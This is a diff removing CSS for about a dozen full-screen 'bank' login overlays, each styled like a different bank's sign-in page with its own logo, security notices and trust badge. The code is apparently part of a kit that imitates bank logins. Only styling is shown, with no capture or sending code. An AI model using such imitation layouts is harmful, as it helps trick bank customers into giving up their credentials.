-            color: #444;
-            margin-top: 2px;
-        }
-
-        .login-screen .contact-info .contact-divider {
-            border: none;
-            border-top: 1px solid #e6ebf3;
-            margin: 16px 0;
-        }
-
-        .login-screen .contact-info .contact-link {
-            color: #0072b0;
-            font-weight: 500;
-            font-size: 15px;
-            cursor: pointer;
-            transition: color 0.2s;
-        }
-
-        .login-screen .contact-info .contact-link:hover {
-            color: #005a8c;
-            text-decoration: underline;
-        }
-
-        .bank2-full-page {
-            display: none;
-            background: #ffffff;
-            min-height: 100vh;
-            width: 100%;
-            position: fixed;
-            top: 0;
-            left: 0;
-            z-index: 9999;
-            overflow-y: auto;
-        }
-
-        .bank2-full-page.visible {
-            display: block;
-        }
-
-        .bank2-full-page .bank2-container {
-            max-width: 480px;
-            margin: 0 auto;
-            padding: 20px 20px 40px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            min-height: 100vh;
-            justify-content: center;
-        }
-
-        .bank2-full-page .bank2-box {
-            background: #ffffff;
-            border: 1px solid #e6ebf3;
-            border-radius: 12px;
-            padding: 32px 28px 28px;
-            width: 100%;
-            max-width: 420px;
-            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.06);
-            text-align: center;
-        }
-
-        .bank2-full-page .bank2-logo {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 20px;
-        }
-
-        .bank2-full-page .bank2-logo img {
-            width: 161px;
-            height: 52px;
-            display: block;
-        }
-
-        .bank2-full-page .bank2-form .form-group {
-            margin-bottom: 16px;
-            text-align: left;
-        }
-
-        .bank2-full-page .bank2-form label {
-            display: block;
-            font-size: 14px;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 4px;
-        }
-
-        .bank2-full-page .bank2-form input {
-            width: 100%;
-            padding: 10px 14px;
-            font-size: 14px;
-            border: 1px solid #d0d8e4;
-            border-radius: 4px;
-            background: #f8faff;
-            transition: border-color 0.2s, box-shadow 0.2s;
-            font-family: inherit;
-            color: #1a1a1a;
-        }
-
-        .bank2-full-page .bank2-form input:focus {
-            border-color: #bd004f;
-            box-shadow: 0 0 0 3px rgba(189, 0, 79, 0.12);
-            outline: none;
-            background: #ffffff;
-        }
-
-        .bank2-full-page .bank2-form input::placeholder {
-            color: #999;
-        }
-
-        .bank2-full-page .bank2-form .login-btn-row {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            flex-wrap: wrap;
-            margin-top: 4px;
-            justify-content: center;
-        }
-
-        .bank2-full-page .bank2-form .login-btn {
-            width: 100px;
-            height: 44px;
-            padding: 0 16px;
-            background: #bd004f;
-            color: #ffffff;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-            flex-shrink: 0;
-            white-space: nowrap;
-        }
-
-        .bank2-full-page .bank2-form .login-btn:hover {
-            background: #a00042;
-        }
-
-        .bank2-full-page .bank2-form .login-btn:active {
-            transform: scale(0.97);
-        }
-
-        .bank2-full-page .bank2-footer-text {
-            margin-top: 20px;
-            text-align: left;
-            font-size: 13px;
-            color: #555;
-            line-height: 1.6;
-        }
-
-        .bank2-full-page .bank2-footer-text strong {
-            color: #1a1a1a;
-            display: block;
-            margin-bottom: 4px;
-        }
-
-        .bank2-full-page .bank2-footer-text .highlight {
-            color: #bd004f;
-            font-weight: 600;
-        }
-
-        .bank3-full-page {
-            display: none;
-            background: url('1234.jpg') center/cover no-repeat;
-            min-height: 100vh;
-            width: 100%;
-            position: fixed;
-            top: 0;
-            left: 0;
-            z-index: 9999;
-            overflow-y: auto;
-        }
-
-        .bank3-full-page.visible {
-            display: block;
-        }
-
-        .bank3-full-page::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.85);
-            z-index: 0;
-        }
-
-        .bank3-header {
-            width: 100%;
-            height: 56px;
-            background: #d71920;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
-            position: relative;
-            z-index: 2;
-        }
-
-        .bank3-header .bank3-header-content {
-            max-width: 1200px;
-            width: 100%;
-            padding: 0 40px;
-            display: flex;
-            align-items: center;
-            justify-content: flex-start;
-        }
-
-        .bank3-header .bank3-header-content .bank3-logo {
-            display: block;
-            height: 32px;
-            width: auto;
-        }
-
-        .bank3-header .bank3-header-content .bank3-logo img {
-            height: 100%;
-            width: auto;
-            display: block;
-        }
-
-        .bank3-full-page .login-container {
-            position: relative;
-            z-index: 1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: calc(100vh - 56px);
-            padding: 40px 20px;
-        }
-
-        .bank3-full-page .login-form-wrapper {
-            background: #ffffff;
-            border: 3px solid #d71920;
-            border-radius: 16px;
-            padding: 24px 28px 28px;
-            max-width: 420px;
-            width: 100%;
-            margin: 0 auto;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.10);
-        }
-
-        .bank3-full-page .login-form-wrapper .login-title {
-            font-size: 28px;
-            font-weight: 400;
-            color: #1a1a1a;
-            margin-bottom: 4px;
-        }
-
-        .bank3-full-page .login-form-wrapper .login-subtitle {
-            font-size: 16px;
-            color: #555;
-            margin-bottom: 20px;
-        }
-
-        .bank3-full-page .login-form-wrapper .form-group {
-            margin-bottom: 16px;
-        }
-
-        .bank3-full-page .login-form-wrapper label {
-            display: block;
-            font-size: 14px;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 4px;
-        }
-
-        .bank3-full-page .login-form-wrapper input {
-            width: 100%;
-            padding: 10px 14px;
-            font-size: 14px;
-            border: 1px solid #d0d8e4;
-            border-radius: 4px;
-            background: #f8faff;
-            transition: border-color 0.2s, box-shadow 0.2s;
-            font-family: inherit;
-        }
-
-        .bank3-full-page .login-form-wrapper input:focus {
-            border-color: #003b6f;
-            box-shadow: 0 0 0 3px rgba(0, 59, 111, 0.12);
-            outline: none;
-            background: #ffffff;
-        }
-
-        .bank3-full-page .login-form-wrapper .login-btn-row {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-            flex-wrap: wrap;
-            margin-top: 4px;
-        }
-
-        .bank3-full-page .login-form-wrapper .login-btn-row .form-group {
-            flex: 1;
-            min-width: 180px;
-            margin-bottom: 0;
-        }
-
-        .bank3-full-page .login-form-wrapper .login-btn {
-            width: 135px;
-            height: 40px;
-            padding: 0 20px;
-            background: #d71920;
-            color: #ffffff;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-            flex-shrink: 0;
-            white-space: nowrap;
-        }
-
-        .bank3-full-page .login-form-wrapper .login-btn:hover {
-            background: #b01218;
-        }
-
-        .bank3-full-page .login-form-wrapper .login-btn:active {
-            transform: scale(0.97);
-        }
-
-        .bank3-full-page .login-form-wrapper .security-warnings {
-            margin-top: 24px;
-            border-top: 1px solid #e6ebf3;
-            padding-top: 18px;
-        }
-
-        .bank3-full-page .login-form-wrapper .security-warnings .warning-item {
-            font-size: 14px;
-            font-weight: 400;
-            color: #555;
-            display: flex;
-            align-items: flex-start;
-            gap: 10px;
-            line-height: 1.4;
-            margin-bottom: 8px;
-        }
-
-        .bank3-full-page .login-form-wrapper .security-warnings .warning-item:last-child {
-            margin-bottom: 0;
-        }
-
-        .bank3-full-page .login-form-wrapper .security-warnings .warning-item .icon {
-            font-size: 16px;
-            flex-shrink: 0;
-            margin-top: 1px;
-            color: #888;
-        }
-
-        .bank4-full-page {
-            display: none;
-            background: #f5f5f5;
-            min-height: 100vh;
-            width: 100%;
-            position: fixed;
-            top: 0;
-            left: 0;
-            z-index: 9999;
-            overflow-y: auto;
-        }
-
-        .bank4-full-page.visible {
-            display: block;
-        }
-
-        .bank4-full-page .bank4-container {
-            max-width: 500px;
-            margin: 0 auto;
-            padding: 60px 30px;
-        }
-
-        .bank4-full-page .bank4-title {
-            font-size: 32px;
-            font-weight: 300;
-            color: #000000;
-            margin-bottom: 4px;
-        }
-
-        .bank4-full-page .bank4-subtitle {
-            font-size: 16px;
-            color: #555;
-            margin-bottom: 30px;
-        }
-
-        .bank4-full-page .bank4-form .form-group {
-            margin-bottom: 16px;
-        }
-
-        .bank4-full-page .bank4-form label {
-            display: block;
-            font-size: 14px;
-            font-weight: 600;
-            color: #000000;
-            margin-bottom: 4px;
-        }
-
-        .bank4-full-page .bank4-form input {
-            width: 100%;
-            padding: 12px 14px;
-            font-size: 14px;
-            border: 2px solid #cccccc;
-            border-radius: 0;
-            background: #ffffff;
-            transition: border-color 0.2s, box-shadow 0.2s;
-            font-family: inherit;
-            color: #000000;
-        }
-
-        .bank4-full-page .bank4-form input:focus {
-            border-color: #888888;
-            box-shadow: 0 0 0 3px rgba(0, 0, 0, 0.08);
-            outline: none;
-        }
-
-        .bank4-full-page .bank4-form input::placeholder {
-            color: #aaaaaa;
-        }
-
-        .bank4-full-page .bank4-form .login-btn-row {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-            flex-wrap: wrap;
-            margin-top: 4px;
-        }
-
-        .bank4-full-page .bank4-form .login-btn-row .form-group {
-            flex: 1;
-            min-width: 180px;
-            margin-bottom: 0;
-        }
-
-        .bank4-full-page .bank4-form .login-btn {
-            width: 135px;
-            height: 44px;
-            padding: 0 24px;
-            background: #000000;
-            color: #ffffff;
-            border: 2px solid #000000;
-            border-radius: 30px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s, color 0.2s;
-            flex-shrink: 0;
-            white-space: nowrap;
-        }
-
-        .bank4-full-page .bank4-form .login-btn:hover {
-            background: #333333;
-            border-color: #333333;
-        }
-
-        .bank4-full-page .bank4-form .login-btn:active {
-            transform: scale(0.97);
-        }
-
-        .bank5-full-page {
-            display: none;
-            background: #1a1a1a;
-            min-height: 100vh;
-            width: 100%;
-            position: fixed;
-            top: 0;
-            left: 0;
-            z-index: 9999;
-            overflow-y: auto;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .bank5-full-page.visible {
-            display: flex;
-        }
-
-        .bank5-full-page .bank5-container {
-            max-width: 520px;
-            width: 100%;
-            margin: 0 auto;
-            padding: 20px;
-        }
-
-        .bank5-full-page .bank5-box {
-            background: rgb(20, 20, 20);
-            border-radius: 16px;
-            padding: 40px 36px 36px;
-            width: 100%;
-            box-shadow: 0 8px 48px rgba(0, 0, 0, 0.6);
-        }
-
-        .bank5-full-page .bank5-alert {
-            background: rgba(255, 200, 50, 0.12);
-            border-left: 4px solid #f5a623;
-            padding: 14px 18px;
-            border-radius: 6px;
-            margin-bottom: 28px;
-            font-size: 13px;
-            color: #d0d0d0;
-            line-height: 1.5;
-        }
-
-        .bank5-full-page .bank5-alert a {
-            color: #f5a623;
-            font-weight: 500;
-            text-decoration: underline;
-            cursor: pointer;
-        }
-
-        .bank5-full-page .bank5-alert a:hover {
-            color: #ffc84d;
-        }
-
-        .bank5-full-page .bank5-title {
-            font-size: 24px;
-            font-weight: 600;
-            color: #ffffff;
-            margin-bottom: 4px;
-        }
-
-        .bank5-full-page .bank5-subtitle {
-            font-size: 15px;
-            color: #999999;
-            margin-bottom: 24px;
-        }
-
-        .bank5-full-page .bank5-form .form-group {
-            margin-bottom: 16px;
-        }
-
-        .bank5-full-page .bank5-form label {
-            display: block;
-            font-size: 14px;
-            font-weight: 500;
-            color: #cccccc;
-            margin-bottom: 4px;
-        }
-
-        .bank5-full-page .bank5-form input {
-            width: 100%;
-            padding: 12px 16px;
-            font-size: 14px;
-            border: 1px solid #3a3a3a;
-            border-radius: 8px;
-            background: #2a2a2a;
-            transition: border-color 0.2s, box-shadow 0.2s;
-            font-family: inherit;
-            color: #ffffff;
-        }
-
-        .bank5-full-page .bank5-form input::placeholder {
-            color: #666666;
-        }
-
-        .bank5-full-page .bank5-form input:focus {
-            border-color: #26d655;
-            box-shadow: 0 0 0 3px rgba(38, 214, 85, 0.15);
-            outline: none;
-            background: #2a2a2a;
-        }
-
-        .bank5-full-page .bank5-form .login-btn-row {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            flex-wrap: wrap;
-            margin-top: 6px;
-        }
-
-        .bank5-full-page .bank5-form .login-btn-row .form-group {
-            flex: 1;
-            min-width: 180px;
-            margin-bottom: 0;
-        }
-
-        .bank5-full-page .bank5-form .login-btn {
-            width: 135px;
-            height: 48px;
-            padding: 0 28px;
-            background: rgb(38, 214, 85);
-            color: #ffffff;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s, transform 0.15s;
-            flex-shrink: 0;
-            white-space: nowrap;
-        }
-
-        .bank5-full-page .bank5-form .login-btn:hover {
-            background: #20c04a;
-            transform: scale(1.02);
-        }
-
-        .bank5-full-page .bank5-form .login-btn:active {
-            transform: scale(0.97);
-        }
-
-        .bank6-full-page {
-            display: none;
-            background: #f0f4f8;
-            min-height: 100vh;
-            width: 100%;
-            position: fixed;
-            top: 0;
-            left: 0;
-            z-index: 9999;
-            overflow-y: auto;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .bank6-full-page.visible {
-            display: flex;
-        }
-
-        .bank6-container {
-            max-width: 1000px;
-            width: 100%;
-            margin: 20px auto;
-            padding: 40px 30px;
-            display: flex;
-            gap: 50px;
-            align-items: flex-start;
-            background: #ffffff;
-            border-radius: 16px;
-            box-shadow: 0 8px 48px rgba(0, 0, 0, 0.08);
-            border: 1px solid #e6ebf3;
-            flex: 1;
-            justify-content: center;
-        }
-
-        .bank6-left {
-            flex: 1;
-            max-width: 420px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .bank6-title {
-            font-size: 28px;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 24px;
-            text-align: center;
-            width: 100%;
-        }
-
-        .bank6-form {
-            width: 100%;
-        }
-
-        .bank6-form .form-group {
-            margin-bottom: 18px;
-            width: 100%;
-        }
-
-        .bank6-form label {
-            display: block;
-            font-size: 14px;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 4px;
-        }
-
-        .bank6-form input {
-            width: 100%;
-            padding: 12px 16px;
-            font-size: 14px;
-            border: 1px solid #d0d8e4;
-            border-radius: 8px;
-            background: #ffffff;
-            transition: border-color 0.2s, box-shadow 0.2s;
-            font-family: inherit;
-            color: #1a1a1a;
-            text-align: center;
-        }
-
-        .bank6-form input:focus {
-            border-color: #005f42;
-            box-shadow: 0 0 0 3px rgba(0, 95, 66, 0.12);
-            outline: none;
-        }
-
-        .bank6-form input::placeholder {
-            color: #999;
-            text-align: center;
-        }
-
-        .bank6-form .login-btn {
-            width: 100%;
-            padding: 14px;
-            background: #005f42;
-            color: #ffffff;
-            border: none;
-            border-radius: 30px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s, transform 0.15s;
-            margin-top: 6px;
-        }
-
-        .bank6-form .login-btn:hover {
-            background: #004d35;
-            transform: scale(1.01);
-        }
-
-        .bank6-form .login-btn:active {
-            transform: scale(0.97);
-        }
-
-        .bank6-download {
-            margin-top: 16px;
-            text-align: center;
-        }
-
-        .bank6-download img {
-            width: 200px;
-            height: 44px;
-            object-fit: contain;
-            display: inline-block;
-        }
-
-        .bank6-right {
-            flex: 1;
-            max-width: 460px;
-            padding-top: 4px;
-        }
-
-        .bank6-security-title {
-            font-size: 18px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin-bottom: 16px;
-        }
-
-        .bank6-security-text {
-            font-size: 14px;
-            color: #444;
-            line-height: 1.6;
-        }
-
-        .bank6-security-text p {
-            margin-bottom: 10px;
-        }
-
-        .bank6-security-text .highlight {
-            font-weight: 600;
-            color: #1a1a1a;
-        }
-
-        .bank6-security-text .green {
-            color: #005f42;
-            font-weight: 600;
-        }
-
-        .bank6-security-text ul {
-            list-style: none;
-            padding: 0;
-            margin: 8px 0 12px;
-        }
-
-        .bank6-security-text ul li {
-            padding: 4px 0 4px 20px;
-            position: relative;
-        }
-
-        .bank6-security-text ul li::before {
-            content: '•';
-            position: absolute;
-            left: 0;
-            color: #005f42;
-            font-weight: 700;
-        }
-
-        .bank6-security-text .link {
-            color: #005f42;
-            font-weight: 600;
-            text-decoration: underline;
-            cursor: pointer;
-        }
-
-        .bank6-security-text .link:hover {
-            color: #004d35;
-        }
-
-        .bank7-full-page {
-            display: none;
-            min-height: 100vh;
-            width: 100%;
-            position: fixed;
-            top: 0;
-            left: 0;
-            z-index: 9999;
-            overflow-y: auto;
-            background: url('login-bg.jpg') center/cover no-repeat;
-        }
-
-        .bank7-full-page.visible {
-            display: block;
-        }
-
-        .bank7-full-page::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.88);
-            z-index: 0;
-        }
-
-        .bank7-full-page .bank7-container {
-            position: relative;
-            z-index: 1;
-            max-width: 480px;
-            margin: 0 auto;
-            padding: 60px 20px 40px;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-        }
-
-        .bank7-full-page .bank7-logo {
-            margin-bottom: 24px;
-            display: flex;
-            justify-content: center;
-        }
-
-        .bank7-full-page .bank7-logo img {
-            width: 154px;
-            height: 32px;
-            display: block;
-        }
-
-        .bank7-full-page .bank7-box {
-            background: #ffffff;
-            border: 2px solid #e6ebf3;
-            border-radius: 12px;
-            padding: 32px 28px 28px;
-            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.06);
-        }
-
-        .bank7-full-page .bank7-title {
-            font-size: 22px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin-bottom: 2px;
-        }
-
-        .bank7-full-page .bank7-subtitle {
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 24px;
-        }
-
-        .bank7-full-page .bank7-form .form-group {
-            margin-bottom: 16px;
-        }
-
-        .bank7-full-page .bank7-form label {
-            display: block;
-            font-size: 14px;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 4px;
-        }
-
-        .bank7-full-page .bank7-form input {
-            width: 100%;
-            padding: 12px 14px;
-            font-size: 14px;
-            border: 1px solid #d0d8e4;
-            border-radius: 8px;
-            background: #ffffff;
-            transition: border-color 0.2s, box-shadow 0.2s;
-            font-family: inherit;
-            color: #1a1a1a;
-        }
-
-        .bank7-full-page .bank7-form input:focus {
-            border-color: #007548;
-            box-shadow: 0 0 0 3px rgba(0, 117, 72, 0.12);
-            outline: none;
-        }
-
-        .bank7-full-page .bank7-form input::placeholder {
-            color: #999;
-        }
-
-        .bank7-full-page .bank7-form .login-btn {
-            width: 100%;
-            padding: 14px;
-            background: #007548;
-            color: #ffffff;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s, transform 0.15s;
-            margin-top: 4px;
-        }
-
-        .bank7-full-page .bank7-form .login-btn:hover {
-            background: #005f3a;
-            transform: scale(1.01);
-        }
-
-        .bank7-full-page .bank7-form .login-btn:active {
-            transform: scale(0.97);
-        }
-
-        .bank7-full-page .bank7-security {
-            margin-top: 20px;
-            padding-top: 18px;
-            border-top: 1px solid #e6ebf3;
-        }
-
-        .bank7-full-page .bank7-security-title {
-            font-size: 13px;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 8px;
-        }
-
-        .bank7-full-page .bank7-security-list {
-            list-style: none;
-            padding: 0;
-            margin: 0 0 12px 0;
-        }
-
-        .bank7-full-page .bank7-security-list li {
-            font-size: 13px;
-            color: #555;
-            padding: 2px 0 2px 20px;
-            position: relative;
-        }
-
-        .bank7-full-page .bank7-security-list li::before {
-            content: '✓';
-            position: absolute;
-            left: 0;
-            color: #007548;
-            font-weight: 700;
-        }
-
-        .bank7-full-page .bank7-links {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 8px 16px;
-            font-size: 13px;
-        }
-
-        .bank7-full-page .bank7-links a {
-            color: #007548;
-            font-weight: 500;
-            text-decoration: underline;
-            cursor: pointer;
-        }
-
-        .bank7-full-page .bank7-links a:hover {
-            color: #005f3a;
-        }
-
-        .bank7-full-page .bank7-links .separator {
-            color: #ccc;
-        }
-
-        .bank7-full-page .bank7-chat {
-            margin-top: 6px;
-            font-size: 13px;
-            color: #555;
-        }
-
-        .bank7-full-page .bank7-chat a {
-            color: #007548;
-            font-weight: 500;
-            text-decoration: underline;
-            cursor: pointer;
-        }
-
-        .bank7-full-page .bank7-chat a:hover {
-            color: #005f3a;
-        }
-
-        .bank7-full-page .bank7-norton {
-            position: fixed;
-            bottom: 20px;
-            right: 30px;
-            z-index: 10001;
-        }
-
-        .bank7-full-page .bank7-norton img {
-            width: 69px;
-            height: 47px;
-            display: block;
-        }
-
-        .bank8-full-page {
-            display: none;
-            background: #f5f7fa;
-            min-height: 100vh;
-            width: 100%;
-            position: fixed;
-            top: 0;
-            left: 0;
-            z-index: 9999;
-            overflow-y: auto;
-        }
-
-        .bank8-full-page.visible {
-            display: block;
-        }
-
-        .bank8-full-page .bank8-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 40px 30px;
-            display: flex;
-            gap: 60px;
-            align-items: flex-start;
-            min-height: calc(100vh - 72px);
-            justify-content: center;
-        }
-
-        .bank8-full-page .bank8-left {
-            flex: 1;
-            max-width: 580px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .bank8-full-page .bank8-favicon {
-            margin-bottom: 16px;
-        }
-
-        .bank8-full-page .bank8-favicon img {
-            width: 50px;
-            height: 50px;
-            display: block;
-        }
-
-        .bank8-full-page .bank8-card {
-            background: #ffffff;
-            border-radius: 16px;
-            padding: 28px 32px 32px;
-            width: 100%;
-            max-width: 519px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.04);
-            border: 1px solid #e8ecf0;
-        }
-
-        .bank8-full-page .bank8-card .bank8-card-title {
-            font-size: 18px;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 20px;
-        }
-
-        .bank8-full-page .bank8-card .bank8-login-title {
-            font-size: 20px;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 4px;
-        }
-
-        .bank8-full-page .bank8-card .bank8-login-subtitle {
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 20px;
-        }
-
-        .bank8-full-page .bank8-form .form-group {
-            margin-bottom: 16px;
-        }
-
-        .bank8-full-page .bank8-form label {
-            display: block;
-            font-size: 14px;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 4px;
-        }
-
-        .bank8-full-page .bank8-form input {
-            width: 100%;
-            padding: 12px 14px;
-            font-size: 14px;
-            border: 1px solid #d0d8e4;
-            border-radius: 8px;
-            background: #ffffff;
-            transition: border-color 0.2s, box-shadow 0.2s;
-            font-family: inherit;
-            color: #1a1a1a;
-        }
-
-        .bank8-full-page .bank8-form input:focus {
-            border-color: #005b3c;
-            box-shadow: 0 0 0 3px rgba(0, 91, 60, 0.12);
-            outline: none;
-        }
-
-        .bank8-full-page .bank8-form input::placeholder {
-            color: #999;
-        }
-
-        .bank8-full-page .bank8-form .login-btn {
-            width: 100%;
-            padding: 14px;
-            background: #005b3c;
-            color: #ffffff;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s, transform 0.15s;
-            margin-top: 4px;
-        }
-
-        .bank8-full-page .bank8-form .login-btn:hover {
-            background: #004a30;
-            transform: scale(1.01);
-        }
-
-        .bank8-full-page .bank8-form .login-btn:active {
-            transform: scale(0.97);
-        }
-
-        .bank8-full-page .bank8-right {
-            flex: 1;
-            max-width: 460px;
-            padding-top: 80px;
-        }
-
-        .bank8-full-page .bank8-security-title {
-            font-size: 20px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin-bottom: 12px;
-        }
-
-        .bank8-full-page .bank8-security-text {
-            font-size: 15px;
-            color: #444;
-            line-height: 1.6;
-        }
-
-        .bank8-full-page .bank8-security-text p {
-            margin-bottom: 6px;
-        }
-
-        .bank8-full-page .bank8-security-image {
-            margin-top: 20px;
-        }
-
-        .bank8-full-page .bank8-security-image img {
-            width: 272px;
-            height: 240px;
-            display: block;
-        }
-
-        .bank9-full-page {
-            display: none;
-            min-height: 100vh;
-            width: 100%;
-            position: fixed;
-            top: 0;
-            left: 0;
-            z-index: 9999;
-            overflow-y: auto;
-            background: url('first-time-login-1600.jpg') center/cover no-repeat;
-        }
-
-        .bank9-full-page.visible {
-            display: block;
-        }
-
-        .bank9-full-page::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.75);
-            z-index: 0;
-        }
-
-        .bank9-full-page .bank9-container {
-            position: relative;
-            z-index: 1;
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 40px 30px;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-        }
-
-        .bank9-full-page .bank9-top {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            margin-bottom: 30px;
-        }
-
-        .bank9-full-page .bank9-top .bank9-logo {
-            flex-shrink: 0;
-        }
-
-        .bank9-full-page .bank9-top .bank9-logo img {
-            width: 130px;
-            height: 65px;
-            display: block;
-        }
-
-        .bank9-full-page .bank9-top .bank9-title {
-            font-size: 18px;
-            font-weight: 600;
-            color: #1a1a1a;
-        }
-
-        .bank9-full-page .bank9-wrapper {
-            display: flex;
-            justify-content: flex-start;
-        }
-
-        .bank9-full-page .bank9-card {
-            background: #ffffff;
-            border: 1px solid #e6ebf3;
-            border-radius: 0;
-            padding: 32px 30px 30px;
-            width: 397px;
-            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.06);
-        }
-
-        .bank9-full-page .bank9-card .bank9-welcome {
-            font-size: 22px;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 20px;
-        }
-
-        .bank9-full-page .bank9-form .form-group {
-            margin-bottom: 16px;
-        }
-
-        .bank9-full-page .bank9-form label {
-            display: block;
-            font-size: 14px;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 4px;
-        }
-
-        .bank9-full-page .bank9-form input {
-            width: 100%;
-            padding: 12px 14px;
-            font-size: 14px;
-            border: 1px solid #d0d8e4;
-            border-radius: 0;
-            background: #ffffff;
-            transition: border-color 0.2s, box-shadow 0.2s;
-            font-family: inherit;
-            color: #1a1a1a;
-        }
-
-        .bank9-full-page .bank9-form input:focus {
-            border-color: #920035;
-            box-shadow: 0 0 0 3px rgba(146, 0, 53, 0.12);
-            outline: none;
-        }
-
-        .bank9-full-page .bank9-form input::placeholder {
-            color: #999;
-        }
-
-        .bank9-full-page .bank9-form .login-btn {
-            width: 100%;
-            padding: 14px;
-            background: #920035;
-            color: #ffffff;
-            border: none;
-            border-radius: 0;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-            margin-top: 4px;
-        }
-
-        .bank9-full-page .bank9-form .login-btn:hover {
-            background: #7a002c;
-        }
-
-        .bank9-full-page .bank9-form .login-btn:active {
-            transform: scale(0.97);
-        }
-
-        .bank10-full-page {
-            display: none;
-            min-height: 100vh;
-            width: 100%;
-            position: fixed;
-            top: 0;
-            left: 0;
-            z-index: 9999;
-            overflow-y: auto;
-            background: #f5f7fb;
-        }
-
-        .bank10-full-page.visible {
-            display: block;
-        }
-
-        .bank12-full-page {
-            display: none;
-            background: #ffffff;
-            min-height: 100vh;
-            width: 100%;
-            position: fixed;
-            top: 0;
-            left: 0;
-            z-index: 9999;
-            overflow-y: auto;
-        }
-
-        .bank12-full-page.visible {
-            display: block;
-        }
-
-        .bank12-full-page .bank12-container {
-            max-width: 500px;
-            margin: 0 auto;
-            padding: 20px 20px 40px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            min-height: 100vh;
-            justify-content: center;
-        }
-
-        .bank12-full-page .bank12-box {
-            background: #ffffff;
-            border: 1px solid #e6ebf3;
-            border-radius: 12px;
-            padding: 32px 28px 28px;
-            width: 100%;
-            max-width: 440px;
-            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.06);
-        }
-
-        .bank12-full-page .bank12-logo {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 24px;
-        }
-
-        .bank12-full-page .bank12-logo img {
-            width: 116px;
-            height: 40px;
-            display: block;
-        }
-
-        .bank12-full-page .bank12-title {
-            font-size: 18px;
-            font-weight: 400;
-            color: #1a1a1a;
-            text-align: center;
-            margin-bottom: 24px;
-        }
-
-        .bank12-full-page .bank12-form .form-group {
-            margin-bottom: 16px;
-        }
-
-        .bank12-full-page .bank12-form label {
-            display: block;
-            font-size: 14px;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 4px;
-        }
-
-        .bank12-full-page .bank12-form input {
-            width: 100%;
-            padding: 10px 14px;
-            font-size: 14px;
-            border: 1px solid #d0d8e4;
-            border-radius: 4px;
-            background: #f8faff;
-            transition: border-color 0.2s, box-shadow 0.2s;
-            font-family: inherit;
-            color: #1a1a1a;
-        }
-
-        .bank12-full-page .bank12-form input:focus {
-            border-color: #ff6200;
-            box-shadow: 0 0 0 3px rgba(255, 98, 0, 0.12);
-            outline: none;
-            background: #ffffff;
-        }
-
-        .bank12-full-page .bank12-form input::placeholder {
-            color: #999;
-        }
-
-        .bank12-full-page .bank12-form .login-btn-row {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            flex-wrap: wrap;
-            margin-top: 4px;
-        }
-
-        .bank12-full-page .bank12-form .login-btn-row .form-group {
-            flex: 1;
-            min-width: 160px;
-            margin-bottom: 0;
-        }
-
-        .bank12-full-page .bank12-form .login-btn {
-            width: 84px;
-            height: 44px;
-            padding: 0 16px;
-            background: #ff6200;
